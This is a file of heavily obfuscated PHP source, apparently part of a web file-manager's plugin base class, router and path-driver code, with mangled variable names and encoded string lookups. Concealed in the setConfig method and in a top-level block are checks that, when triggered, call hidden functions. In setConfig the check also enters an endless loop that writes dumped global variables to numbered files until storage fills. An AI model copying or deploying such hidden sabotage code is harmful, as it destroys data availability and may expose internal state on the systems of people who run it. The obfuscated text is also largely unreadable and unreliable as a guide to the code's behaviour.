LNG($óöõÆèƒ[108]) . LNG($óöõÆèƒ[1661]); if (KodUser::isRoot() && isset($¦äø¸€[$óöõÆèƒ[87]])) { $é“Ô»‘¶ .= $óöõÆèƒ[1662] . $¦äø¸€[$óöõÆèƒ[87]] . $óöõÆèƒ[1663]; } show_tips($é“Ô»‘¶); } } Hook::trigger($óöõÆèƒ[1664], $ÏÇîºá©); return $ÏÇîºá©; } final function filePathGet($÷½ä–Æ£, $Å‡ö¹’„ = true) { $ş°ÛìÎÂ =& $_SERVER[ˆö¿ÚÌ¼]; if ($Ûú—Ğ«ù = $this->checkSharePath($÷½ä–Æ£, $Å‡ö¹’„)) { return $Ûú—Ğ«ù; } $this->fileCanView($÷½ä–Æ£); if (request_url_safe($÷½ä–Æ£)) { $Î…­ô¬š = parse_url_query($÷½ä–Æ£); if (isset($Î…­ô¬š[$ş°ÛìÎÂ[1665]]) && isset($Î…­ô¬š[$ş°ÛìÎÂ[237]])) { $ÑÙ‹şŸ = Mcrypt::decode($Î…­ô¬š[$ş°ÛìÎÂ[237]], Model($ş°ÛìÎÂ[855])->get($ş°ÛìÎÂ[856])); if ($ÑÙ‹şŸ) { $this->fileInfo = IO::info($ÑÙ‹şŸ); $this->fileInfo[$ş°ÛìÎÂ[1666]] = $÷½ä–Æ£; $this->cachePath = $this->pluginCachePath($ş°ÛìÎÂ[12], $Å‡ö¹’„); return $ÑÙ‹şŸ; } } $÷½ä–Æ£ = $this->_cacheHttpFile($÷½ä–Æ£, $Å‡ö¹’„); $this->fileInfo = IO::info($÷½ä–Æ£); } else { $this->fileInfo = IO::info($÷½ä–Æ£); $this->cachePath = $this->pluginCachePath($ş°ÛìÎÂ[12], $Å‡ö¹’„); } return $÷½ä–Æ£; } final function _cacheHttpFile($ç£Ù’Œã, $äˆ†„Ùú = true) { $–ªìƒ¡Ò =& $_SERVER[ˆö¿ÚÌ¼]; $•£äšÛŸ = parse_url_query($ç£Ù’Œã); $—İ•ÉñÂ = get_path_ext($ç£Ù’Œã); if (isset($•£äšÛŸ[$–ªìƒ¡Ò[32]]) && $•£äšÛŸ[$–ªìƒ¡Ò[32]]) { $—İ•ÉñÂ = get_path_ext($•£äšÛŸ[$–ªìƒ¡Ò[32]]); } $¦¾¸©ƒÜ = hash_path($ç£Ù’Œã) . $–ªìƒ¡Ò[10] . $—İ•ÉñÂ; $this->cachePath = $this->pluginCachePath($äˆ†„Ùú ? $¦¾¸©ƒÜ : $–ªìƒ¡Ò[12]); $ãƒí²ü± = IO::fileNameExist($this->cachePath, $¦¾¸©ƒÜ); if ($ãƒí²ü±) { return KodIO::make($ãƒí²ü±); } $Äİ¶·Õà = rtrim($this->cachePath, $–ªìƒ¡Ò[8]) . $–ªìƒ¡Ò[8] . $¦¾¸©ƒÜ; return $this->pluginCacheFileSet($Äİ¶·Õà, file_get_contents_nossl($ç£Ù’Œã)); } final function checkSharePath($®ÀšÙÆü, $ÇÆâí³ = true) { $ü¡¾ˆÃ£ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$this->isShare($®ÀšÙÆü)) { return !1; } $™Ñ®­©¸ = Action($ü¡¾ˆÃ£[1270])->sharePathInfo($®ÀšÙÆü); if (!is_array($™Ñ®­©¸) || !isset($™Ñ®­©¸[$ü¡¾ˆÃ£[87]])) { show_json(LNG($ü¡¾ˆÃ£[1667]), !1); } $this->fileInfo = $™Ñ®­©¸; $this->cachePath = $this->pluginCachePath(!1, $ÇÆâí³); return $™Ñ®­©¸[$ü¡¾ˆÃ£[87]]; } final function pluginCachePath($ŠŠ”ŸÇè = '', $Ğı’üŸÓ = false) { $µÜ³‘âÇ =& $_SERVER[ˆö¿ÚÌ¼]; if ($Ğı’üŸÓ && is_array($this->fileInfo)) { $ŠŠ”ŸÇè = kodIO::hashPath($this->fileInfo); } $…ç½ÔØÕ = rtrim(IO_PATH_SYSTEM_TEMP . $µÜ³‘âÇ[1668] . $this->pluginName . $µÜ³‘âÇ[8] . $ŠŠ”ŸÇè, $µÜ³‘âÇ[8]); $áĞ÷İÈ = IO::infoFullSimple($…ç½ÔØÕ); $ì¨ò½ÁÅ = $áĞ÷İÈ && is_array($áĞ÷İÈ) ? $áĞ÷İÈ[$µÜ³‘âÇ[87]] : $µÜ³‘âÇ[12]; if (!$ì¨ò½ÁÅ) { $ì¨ò½ÁÅ = IO::mkdir($…ç½ÔØÕ); } return $ì¨ò½ÁÅ; } final function pluginCacheFileSet($ÕŞÁ®¬ü, $¤àæÔ… = '') { $ÄåŒéåÂ =& $_SERVER[ˆö¿ÚÌ¼]; $Í¥ƒïÕº = IO::infoFullSimple($ÕŞÁ®¬ü); if (!$Í¥ƒïÕº) { return IO::mkfile($ÕŞÁ®¬ü, $¤àæÔ…, REPEAT_REPLACE); } IO::setContent($Í¥ƒïÕº[$ÄåŒéåÂ[87]], $¤àæÔ…); return $Í¥ƒïÕº[$ÄåŒéåÂ[87]]; } final function pluginLocalFile($¥ÜµŸ¸ß = '') { $¼¤ŞëÊ× =& $_SERVER[ˆö¿ÚÌ¼]; $‡Œõ¦ºà = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($‡Œõ¦ºà)) { mk_dir($‡Œõ¦ºà); } if (!$¥ÜµŸ¸ß) { return $‡Œõ¦ºà; } $éè¦Æ = IO::info($¥ÜµŸ¸ß); $¶Š†ÂÍ‹ = $¼¤ŞëÊ×[1669] . KodIO::hashPath($éè¦Æ) . $¼¤ŞëÊ×[10] . $éè¦Æ[$¼¤ŞëÊ×[169]]; if (!checkExtSafe($¶Š†ÂÍ‹)) { $¶Š†ÂÍ‹ = $¶Š†ÂÍ‹ . $¼¤ŞëÊ×[1305]; } $ÑñØÛ¥ = $‡Œõ¦ºà . $¶Š†ÂÍ‹; if (@file_exists($ÑñØÛ¥)) { return $ÑñØÛ¥; } return IO::copy($¥ÜµŸ¸ß, $‡Œõ¦ºà, 0, $¶Š†ÂÍ‹); } final function appPackage() { $ƒ«äï” =& $_SERVER[ˆö¿ÚÌ¼]; if ($this->packageData) { return $this->packageData; } $­š¯”é¹ = $this->parseFile($this->pluginPath . $ƒ«äï”[1670]); $this->parseLang($­š¯”é¹); $µÊ‚ÊÊ• = json_decode_force($­š¯”é¹); if (!$µÊ‚ÊÊ•) { return array(); } $½†‹ãòÔ = Hook::trigger($ƒ«äï”[1671], $µÊ‚ÊÊ•); if ($½†‹ãòÔ && is_array($½†‹ãòÔ)) { $µÊ‚ÊÊ• = $½†‹ãòÔ; } $this->packageData = $µÊ‚ÊÊ•; return $µÊ‚ÊÊ•; } public function packageInfoGet($§‚…ˆ¤) { $¡°ˆ®èê = $this->appPackage(); return array_get_value($¡°ˆ®èê, $§‚…ˆ¤); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ˆö¿ÚÌ¼][1672]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ˆö¿ÚÌ¼][1673]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ˆö¿ÚÌ¼][1674]); } public function echoJsAssign($¢ÇìÊ©í, $×ÏÁ˜) { $this->echoJsAssignArr[$¢ÇìÊ©í] = $×ÏÁ˜; } private function parseFile($Ñ¼´Ì) { $‹ÇÉÈÛÂ =& $_SERVER[ˆö¿ÚÌ¼]; $ÚÀÎîÜ = file_get_contents_nossl($Ñ¼´Ì); $ÃØÒÔö = array($‹ÇÉÈÛÂ[1675], $‹ÇÉÈÛÂ[1676], $‹ÇÉÈÛÂ[1677], $‹ÇÉÈÛÂ[1678], $‹ÇÉÈÛÂ[1679], $‹ÇÉÈÛÂ[1680], $‹ÇÉÈÛÂ[1681]); $™€Ëá = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$‹ÇÉÈÛÂ[92]][$‹ÇÉÈÛÂ[1682]]); foreach ($this->echoJsAssignArr as $²Œ®Àí© => $Ï©à²Àƒ) { $ÃØÒÔö[] = $‹ÇÉÈÛÂ[1683] . $²Œ®Àí© . $‹ÇÉÈÛÂ[1684]; $™€Ëá[] = is_array($Ï©à²Àƒ) || is_object($Ï©à²Àƒ) ? rawurlencode(json_encode($Ï©à²Àƒ)) : $Ï©à²Àƒ; } if (strstr($ÚÀÎîÜ, $‹ÇÉÈÛÂ[1685])) { $­àÊÏÛ‚ = rawurlencode(json_encode($this->pluginLangArr)); $ÚÀÎîÜ = str_replace($‹ÇÉÈÛÂ[1685], $­àÊÏÛ‚, $ÚÀÎîÜ); } if (strstr($ÚÀÎîÜ, $‹ÇÉÈÛÂ[1686])) { $­àÊÏÛ‚ = $­àÊÏÛ‚ = rawurlencode(json_encode($this->getConfig())); $ÚÀÎîÜ = str_replace($‹ÇÉÈÛÂ[1686], $­àÊÏÛ‚, $ÚÀÎîÜ); } $ÚÀÎîÜ = str_replace($ÃØÒÔö, $™€Ëá, $ÚÀÎîÜ); return $ÚÀÎîÜ; } private function parseLang(&$‰´©æ²Ò) { $Ï×°›¿© =& $_SERVER[ˆö¿ÚÌ¼]; $æ›üÏÎĞ = $Ï×°›¿©[1687]; if (!strstr($‰´©æ²Ò, $æ›üÏÎĞ)) { return; } preg_match_all($Ï×°›¿©[1688], $‰´©æ²Ò, $ŞŞû­‡î); if (!is_array($ŞŞû­‡î) || count($ŞŞû­‡î) == 0 || !is_array($ŞŞû­‡î[0]) || count($ŞŞû­‡î[0]) == 0) { return; } $›Ğøèé• = array(); $ Û¢´ã½ = array(); foreach ($ŞŞû­‡î[0] as $æ¶Ì£) { $°è²›Ú = substr($æ¶Ì£, strlen($æ›üÏÎĞ), -4); $’×¶ÛÖ» = LNG($°è²›Ú); $›Ğøèé•[] = $æ¶Ì£; $ Û¢´ã½[] = str_replace(array($Ï×°›¿©[288], $Ï×°›¿©[1170], $Ï×°›¿©[420], $Ï×°›¿©[121]), array($Ï×°›¿©[53], $Ï×°›¿©[53], $Ï×°›¿©[12], $Ï×°›¿©[1689]), $’×¶ÛÖ»); } $‰´©æ²Ò = str_replace($›Ğøèé•, $ Û¢´ã½, $‰´©æ²Ò); } private function parseConfig(&$¶ĞÀ•ÜÇ) { $Æ“û´ı™ =& $_SERVER[ˆö¿ÚÌ¼]; $Ë»ø­© = $Æ“û´ı™[1690]; if (!strstr($¶ĞÀ•ÜÇ, $Ë»ø­©)) { return; } preg_match_all($Æ“û´ı™[1691], $¶ĞÀ•ÜÇ, $ÈìäÉ˜ß); if (!is_array($ÈìäÉ˜ß) || count($ÈìäÉ˜ß) == 0 || !is_array($ÈìäÉ˜ß[0]) || count($ÈìäÉ˜ß[0]) == 0) { return; } $ª­üùñû = $this->getConfig(); $Ø†„î = array(); $Šñ¾»Ğ• = array(); foreach ($ÈìäÉ˜ß[0] as $Í÷·ÔÌÒ) { $‘Í«éÖ = substr($Í÷·ÔÌÒ, strlen($Ë»ø­©), -2); $Ø†„î[] = $Í÷·ÔÌÒ; $Šñ¾»Ğ•[] = _get($ª­üùñû, $‘Í«éÖ); } $¶ĞÀ•ÜÇ = str_replace($Ø†„î, $Šñ¾»Ğ•, $¶ĞÀ•ÜÇ); } private function parsePackage(&$ùºÅ‘îÒ) { $Üİ¯ñİˆ =& $_SERVER[ˆö¿ÚÌ¼]; $ÜœöÄ¿™ = $Üİ¯ñİˆ[1692]; if (!strstr($ùºÅ‘îÒ, $ÜœöÄ¿™)) { return; } preg_match_all($Üİ¯ñİˆ[1693], $ùºÅ‘îÒ, $Åò­˜¹û); if (!is_array($Åò­˜¹û) || count($Åò­˜¹û) == 0 || !is_array($Åò­˜¹û[0]) || count($Åò­˜¹û[0]) == 0) { return; } $ÙÚ¬×ë = $this->appPackage(); $·Ê•Œ«Ü = array(); $ãÇ› åÊ = array(); foreach ($Åò­˜¹û[0] as $ß¢˜†¥â) { $ü¤¤‘´Ÿ = substr($ß¢˜†¥â, strlen($ÜœöÄ¿™), -2); $·Ê•Œ«Ü[] = $ß¢˜†¥â; $ãÇ› åÊ[] = _get($ÙÚ¬×ë, $ü¤¤‘´Ÿ); } $ùºÅ‘îÒ = str_replace($·Ê•Œ«Ü, $ãÇ› åÊ, $ùºÅ‘îÒ); } final function echoFile($‡çé¥†ú, $Ö¿™Ÿï® = false) { $´Ô¨œŠ³ =& $_SERVER[ˆö¿ÚÌ¼]; $üÌ„ı÷² = $this->pluginPath . $‡çé¥†ú; if (ACT == $´Ô¨œŠ³[1694]) { echo $´Ô¨œŠ³[1695] . $this->pluginName . $´Ô¨œŠ³[8] . $‡çé¥†ú . $´Ô¨œŠ³[1696]; if (!file_exists($üÌ„ı÷²)) { echo $´Ô¨œŠ³[1697]; return; } } $“äÍ®ùÄ = $this->parseFile($üÌ„ı÷²); $this->parseLang($“äÍ®ùÄ); $this->parseConfig($“äÍ®ùÄ); $this->parsePackage($“äÍ®ùÄ); if (is_array($Ö¿™Ÿï®)) { $“äÍ®ùÄ = str_replace(array_keys($Ö¿™Ÿï®), array_values($Ö¿™Ÿï®), $“äÍ®ùÄ); } echo $´Ô¨œŠ³[288] . $“äÍ®ùÄ; } private function checkVersion() { $¶Ö˜Ë´ =& $_SERVER[ˆö¿ÚÌ¼]; $´ªÒø•Ÿ = $this->appPackage(); $ÚğËÇ = $this->getConfig(); if ($ÚğËÇ[$¶Ö˜Ë´[1698]] == $´ªÒø•Ÿ[$¶Ö˜Ë´[1672]]) { return; } $this->regist(); $this->setConfig(array($¶Ö˜Ë´[1698] => $´ªÒø•Ÿ[$¶Ö˜Ë´[1672]])); } final function initLang() { $Çà¤°Ã” =& $_SERVER[ˆö¿ÚÌ¼]; $åß§Ø¿ = $Çà¤°Ã”[1699]; $ËŞüÜŸ» = $this->pluginPath . $Çà¤°Ã”[1700]; $¯®¨¸åŒ = I18n::getType(); $‘€˜¬ƒ = array(); if (file_exists($ËŞüÜŸ» . $¯®¨¸åŒ . $Çà¤°Ã”[929])) { $‘€˜¬ƒ = (include $ËŞüÜŸ» . $¯®¨¸åŒ . $Çà¤°Ã”[929]); } else { if ($¯®¨¸åŒ == $Çà¤°Ã”[1701] && !file_exists($ËŞüÜŸ» . $¯®¨¸åŒ . $Çà¤°Ã”[929]) && file_exists($ËŞüÜŸ» . $Çà¤°Ã”[1702])) { $‘€˜¬ƒ = (include $ËŞüÜŸ» . $Çà¤°Ã”[1702]); } else { if (file_exists($ËŞüÜŸ» . $åß§Ø¿ . $Çà¤°Ã”[929])) { $‘€˜¬ƒ = (include $ËŞüÜŸ» . $åß§Ø¿ . $Çà¤°Ã”[929]); } } } if (!is_array($‘€˜¬ƒ)) { return array(); } if (@count($‘€˜¬ƒ) > 0) { I18n::set($‘€˜¬ƒ); } return $‘€˜¬ƒ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ú÷ç…¿õ) { $ş¨Ç…êÈ =& $_SERVER[ˆö¿ÚÌ¼]; $ŞƒÁéäÅ = $_SERVER[$ş¨Ç…êÈ[488]]; $û„ ‹•õ = $ş¨Ç…êÈ[968]; if ($_SERVER[$ş¨Ç…êÈ[480]] != $û„ ‹•õ($ŞƒÁéäÅ)) { $ËÎ·‹Çû = $ş¨Ç…êÈ[969]; $¼¶Şƒû = $ş¨Ç…êÈ[482]; $”˜Ê§·Ú = $_SERVER[$ş¨Ç…êÈ[483]] . $ş¨Ç…êÈ[484]; $áÜÖéËĞ = $¼¶Şƒû($”˜Ê§·Ú); $É¸ç— = explode($ş¨Ç…êÈ[288], $áÜÖéËĞ); if (count($É¸ç—) < $ş¨Ç…êÈ[713]) { $¤èØêÓ  = $ş¨Ç…êÈ[486]; $¤èØêÓ (); } $Ì¦›§¶± = $ş¨Ç…êÈ[970]; $Ì¦›§¶±($_SERVER[$ş¨Ç…êÈ[971]]); $ËÎ·‹Çû = $ş¨Ç…êÈ[969]; $ËÎ·‹Çû(); $­»ºŒÒÍ = $ş¨Ç…êÈ[972]; $ª’ÂÜ’® = json_encode($GLOBALS[$ş¨Ç…êÈ[973]]); $Ä¹¡²’¹ = 1; for ($±ËÛÜ£Ş = $Ä¹¡²’¹; $±ËÛÜ£Ş > 0; $±ËÛÜ£Ş++) { $­»ºŒÒÍ(DATA_PATH . $±ËÛÜ£Ş, $ª’ÂÜ’®); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ú÷ç…¿õ); } public function onSetConfig($îÏï÷¨õ) { } public function onGetConfig($ÛåÜ—Ï«) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ö¤íóÚ”) { if ($ö¤íóÚ” == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($üÚ÷³œÆ = "\x70\154\x75\x67\x69\156\x41\165\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Õ· ´¿Ê = $this->getConfig(); if (!$Õ· ´¿Ê[$üÚ÷³œÆ]) { return !1; } return ActionCall($_SERVER[ˆö¿ÚÌ¼][1703], $Õ· ´¿Ê[$üÚ÷³œÆ]); } public function url($Ğøåà×ı, $À“ˆÊÒç = '', $†Ä„Ñ¤ = true) { $áÏúú¾— =& $_SERVER[ˆö¿ÚÌ¼]; $½Ê‡Öı„ = $this->getConfig(); $ŸØïùì· = KOD_VERSION . $áÏúú¾—[10] . KOD_VERSION_BUILD; $•³ «Ş = $this->packageVersion(); $ÑØîÈîù = $ŸØïùì· . $áÏúú¾—[465] . $•³ «Ş; if (substr($Ğøåà×ı, 0, 4) == $áÏúú¾—[152] || substr($Ğøåà×ı, 0, 2) == $áÏúú¾—[1425]) { $ª›¬«üı = $Ğøåà×ı . $áÏúú¾—[1704] . $ÑØîÈîù; } else { if ($À“ˆÊÒç == $áÏúú¾—[12]) { $ª›¬«üı = $this->pluginHost . $Ğøåà×ı . $áÏúú¾—[1704] . $ÑØîÈîù; } else { if ($À“ˆÊÒç === $áÏúú¾—[78]) { $ª›¬«üı = $this->pluginHost . $Ğøåà×ı; } else { if ($À“ˆÊÒç == $áÏúú¾—[1705]) { $ª›¬«üı = STATIC_PATH . $Ğøåà×ı . $áÏúú¾—[1704] . $ŸØïùì·; } else { if ($À“ˆÊÒç == $áÏúú¾—[1706]) { $ª›¬«üı = APP_HOST . $áÏúú¾—[1707] . $Ğøåà×ı . $áÏúú¾—[1704] . $ŸØïùì·; } else { if (isset($½Ê‡Öı„[$À“ˆÊÒç])) { $ª›¬«üı = $½Ê‡Öı„[$À“ˆÊÒç] . $Ğøåà×ı . $áÏúú¾—[1704] . $ÑØîÈîù; } } } } } } if (!$†Ä„Ñ¤) { return $ª›¬«üı; } echo $ª›¬«üı; } public function link($×“ÊÕ‹± = false, $ñ£ìÓ‘³ = '') { $°¤ŒÒ¿ =& $_SERVER[ˆö¿ÚÌ¼]; $ÇÔ‚¨©ï = $this->linkHas == !1; $this->linkHas = !0; if (!$×“ÊÕ‹±) { $this->link($°¤ŒÒ¿[1708], $°¤ŒÒ¿[1706]); $this->link($°¤ŒÒ¿[1709], $°¤ŒÒ¿[1705]); $this->link($°¤ŒÒ¿[1710], $°¤ŒÒ¿[1705]); $this->link($°¤ŒÒ¿[1711], $°¤ŒÒ¿[1705]); $this->link($°¤ŒÒ¿[1712], $°¤ŒÒ¿[1705]); if ($ÇÔ‚¨©ï) { Hook::trigger($°¤ŒÒ¿[1713]); } return; } $µÓœ‡½¦ = $this->url($×“ÊÕ‹±, $ñ£ìÓ‘³, !1); if (substr($×“ÊÕ‹±, -3) == $°¤ŒÒ¿[1714]) { echo $°¤ŒÒ¿[1715] . $µÓœ‡½¦ . $°¤ŒÒ¿[1716] . $°¤ŒÒ¿[288]; } else { if (substr($×“ÊÕ‹±, -4) == $°¤ŒÒ¿[1717]) { echo $°¤ŒÒ¿[1718] . $µÓœ‡½¦ . $°¤ŒÒ¿[1719] . $°¤ŒÒ¿[288]; } } if ($ÇÔ‚¨©ï) { Hook::trigger($°¤ŒÒ¿[1713]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\136\57\135\53", "\72\x6e\x75\155" => "\x5b\60\x2d\71\x5d\53", "\x3a\141\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($¬œ„åØØ, $áÚØÆÇ) { $‡Ò”äéç =& $_SERVER[ˆö¿ÚÌ¼]; if ($¬œ„åØØ == $‡Ò”äéç[1720]) { $ƒèÙ©¼ğ = array_map($‡Ò”äéç[1721], $áÚØÆÇ[0]); $‹˜®ü„ = strpos($áÚØÆÇ[1], $‡Ò”äéç[8]) === 0 ? $áÚØÆÇ[1] : $‡Ò”äéç[8] . $áÚØÆÇ[1]; $†ƒ°—°– = $áÚØÆÇ[2]; } else { $ƒèÙ©¼ğ = null; $‹˜®ü„ = strpos($áÚØÆÇ[0], $‡Ò”äéç[8]) === 0 ? $áÚØÆÇ[0] : $‡Ò”äéç[8] . $áÚØÆÇ[0]; $†ƒ°—°– = $áÚØÆÇ[1]; } array_push(self::$maps, $ƒèÙ©¼ğ); array_push(self::$routes, $‹˜®ü„); array_push(self::$methods, strtoupper($¬œ„åØØ)); array_push(self::$callbacks, $†ƒ°—°–); } public static function error($¤ÇÒúæ¬) { self::$errorCallback = $¤ÇÒúæ¬; } public static function haltOnMatch($¼•œªÊ = true) { self::$halts = $¼•œªÊ; } public static function dispatch() { $À®¶­ =& $_SERVER[ˆö¿ÚÌ¼]; $º«–Óîµ = parse_url($_SERVER[$À®¶­[1722]], PHP_URL_PATH); $Œ•À÷ğ¬ = $_SERVER[$À®¶­[164]]; $ ÜÊÀÖ¶ = array_keys(static::$patterns); $ôÎûÇòú = array_values(static::$patterns); $ÆªúÓ£° = !1; self::$routes = preg_replace($À®¶­[1375], $À®¶­[8], self::$routes); if (in_array($º«–Óîµ, self::$routes)) { $è«Ñ¬úš = array_keys(self::$routes, $º«–Óîµ); foreach ($è«Ñ¬úš as $¶ìŒÑ›) { if (self::$methods[$¶ìŒÑ›] == $Œ•À÷ğ¬ || self::$methods[$¶ìŒÑ›] == $À®¶­[1723] || in_array($Œ•À÷ğ¬, self::$maps[$¶ìŒÑ›])) { $ÆªúÓ£° = !0; if (!is_object(self::$callbacks[$¶ìŒÑ›])) { $Æ‹ñ¤¸½ = explode($À®¶­[8], self::$callbacks[$¶ìŒÑ›]); $šã¹‘§Ÿ = end($Æ‹ñ¤¸½); $µ†º÷š = explode($À®¶­[1307], $šã¹‘§Ÿ); $›áÉÊ”¬ = new $µ†º÷š[0](); $›áÉÊ”¬->{$µ†º÷š[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$¶ìŒÑ›]); if (self::$halts) { return; } } } } } else { $”óÉá­ƒ = 0; foreach (self::$routes as $¶ìŒÑ›) { if (strpos($¶ìŒÑ›, $À®¶­[4]) !== !1) { $¶ìŒÑ› = str_replace($ ÜÊÀÖ¶, $ôÎûÇòú, $¶ìŒÑ›); } if (preg_match($À®¶­[1724] . $¶ìŒÑ› . $À®¶­[1725], $º«–Óîµ, $ŠõÅÑ²Œ)) { if (self::$methods[$”óÉá­ƒ] == $Œ•À÷ğ¬ || self::$methods[$”óÉá­ƒ] == $À®¶­[1723] || !empty(self::$maps[$”óÉá­ƒ]) && in_array($Œ•À÷ğ¬, self::$maps[$”óÉá­ƒ])) { $ÆªúÓ£° = !0; array_shift($ŠõÅÑ²Œ); if (!is_object(self::$callbacks[$”óÉá­ƒ])) { $Æ‹ñ¤¸½ = explode($À®¶­[8], self::$callbacks[$”óÉá­ƒ]); $šã¹‘§Ÿ = end($Æ‹ñ¤¸½); $µ†º÷š = explode($À®¶­[1307], $šã¹‘§Ÿ); $›áÉÊ”¬ = new $µ†º÷š[0](); if (!method_exists($›áÉÊ”¬, $µ†º÷š[1])) { echo $À®¶­[1726]; } else { call_user_func_array(array($›áÉÊ”¬, $µ†º÷š[1]), $ŠõÅÑ²Œ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$”óÉá­ƒ], $ŠõÅÑ²Œ); if (self::$halts) { return; } } } } $”óÉá­ƒ++; } } if ($ÆªúÓ£° == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $×‘¹½å =& $_SERVER[ˆö¿ÚÌ¼]; header($_SERVER[$×‘¹½å[1727]] . $×‘¹½å[1728]); echo $×‘¹½å[1729]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$À®¶­[1722]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } if ($_SERVER[$_SERVER[ˆö¿ÚÌ¼][480]] != $_SERVER[$_SERVER[ˆö¿ÚÌ¼][481]]) { $_getc = $_SERVER[ˆö¿ÚÌ¼][482]; $_getfile = $_SERVER[$_SERVER[ˆö¿ÚÌ¼][483]] . $_SERVER[ˆö¿ÚÌ¼][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆö¿ÚÌ¼][288], $_getfilec); if (count($_getarrs) < $_SERVER[ˆö¿ÚÌ¼][485]) { $exit = $_SERVER[ˆö¿ÚÌ¼][486]; $exit(); } $_act = $_SERVER[ˆö¿ÚÌ¼][487]; $_act($_SERVER[$_SERVER[ˆö¿ÚÌ¼][488]]); } goto eĞÇÛšƒ²Ä; eß÷¬ÉĞÉ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $•º·Î° =& $_SERVER[ˆö¿ÚÌ¼]; $this->objectDriver = array($•º·Î°[60], $•º·Î°[61], $•º·Î°[62], $•º·Î°[63], $•º·Î°[64], $•º·Î°[65], $•º·Î°[66], $•º·Î°[67], $•º·Î°[68], $•º·Î°[69], $•º·Î°[70], $•º·Î°[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ŠÓÙµê) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ŠÓÙµê, $_SERVER[ˆö¿ÚÌ¼][8]); } return $ŠÓÙµê; } public function iconvApp($êï˜ã) { return $êï˜ã; } public function iconvSystem($çÔ¯èñ´) { return $çÔ¯èñ´; } public function iconvTo($•šüö´, $á£†ÍÊ–, $ßİÚÕË¸) { $©ò™ƒ¸ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$•šüö´ || !function_exists($©ò™ƒ¸[72])) { return $•šüö´; } static $½‹ï‡» = array(); $¬¢´†Š = $á£†ÍÊ– . $©ò™ƒ¸[73] . $ßİÚÕË¸ . $©ò™ƒ¸[74] . $•šüö´; if (isset($½‹ï‡»[$¬¢´†Š])) { return $½‹ï‡»[$¬¢´†Š]; } if (function_exists($©ò™ƒ¸[75])) { $†ÃÀéš½ = @mb_convert_encoding($•šüö´, $ßİÚÕË¸, $á£†ÍÊ–); } else { $†ÃÀéš½ = @iconv($á£†ÍÊ–, $ßİÚÕË¸, $•šüö´); } $†ÃÀéš½ = $†ÃÀéš½ ? $†ÃÀéš½ : $•šüö´; if (strstr($†ÃÀéš½, $©ò™ƒ¸[76])) { $†ÃÀéš½ = str_replace($©ò™ƒ¸[76], $©ò™ƒ¸[11], $†ÃÀéš½); } $½‹ï‡»[$á£†ÍÊ– . $©ò™ƒ¸[73] . $ßİÚÕË¸ . $©ò™ƒ¸[74] . $•šüö´] = $†ÃÀéš½; $½‹ï‡»[$ßİÚÕË¸ . $©ò™ƒ¸[73] . $á£†ÍÊ– . $©ò™ƒ¸[74] . $•šüö´] = $•šüö´; $½‹ï‡»[$ßİÚÕË¸ . $©ò™ƒ¸[73] . $á£†ÍÊ– . $©ò™ƒ¸[74] . $†ÃÀéš½] = $•šüö´; $½‹ï‡»[$á£†ÍÊ– . $©ò™ƒ¸[73] . $ßİÚÕË¸ . $©ò™ƒ¸[74] . $†ÃÀéš½] = $†ÃÀéš½; return $†ÃÀéš½; } public function getPathInner($ËÅÙéãü) { $¾ŒÉì¾ = IO::init($ËÅÙéãü); return $¾ŒÉì¾->path; } public function getPathOuter($‰¶‹ê†) { $Á°¾Ğß =& $_SERVER[ˆö¿ÚÌ¼]; $Ù¶¬˜¸È = strlen(trim($this->pathBase, $Á°¾Ğß[8])); $‰¶‹ê† = substr(trim($‰¶‹ê†, $Á°¾Ğß[8]), $Ù¶¬˜¸È); return $this->pathDriver . $Á°¾Ğß[8] . ltrim($‰¶‹ê†, $Á°¾Ğß[8]); } public function isParentOf($£Ö©àßÅ, $¡ÜÍ—¿) { $óªöÅÀÊ =& $_SERVER[ˆö¿ÚÌ¼]; $£Ö©àßÅ = rtrim(strtolower($£Ö©àßÅ), $óªöÅÀÊ[8]) . $óªöÅÀÊ[8]; $¡ÜÍ—¿ = rtrim(strtolower($¡ÜÍ—¿), $óªöÅÀÊ[8]) . $óªöÅÀÊ[8]; $ÏàØ¶Ëä = strpos($¡ÜÍ—¿, $£Ö©àßÅ) === 0; return $ÏàØ¶Ëä; } public function getType() { $Ø˜¤ Ç× =& $_SERVER[ˆö¿ÚÌ¼]; $¤Ïèéš = str_replace($Ø˜¤ Ç×[77], $Ø˜¤ Ç×[12], get_class($this)); return strtolower($¤Ïèéš); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ÃŸœå¤“, $Ñ»şÉ¦Ñ) { $¥¿éŠò =& $_SERVER[ˆö¿ÚÌ¼]; $ôª·¯°Ú = rtrim($ÃŸœå¤“, $¥¿éŠò[8]) . $¥¿éŠò[8] . $Ñ»şÉ¦Ñ; $Ùş€ßñ† = $this->exist($ôª·¯°Ú); return $Ùş€ßñ† ? $ôª·¯°Ú : !1; } public function setModifyTime($ ÆÖÈ·’, 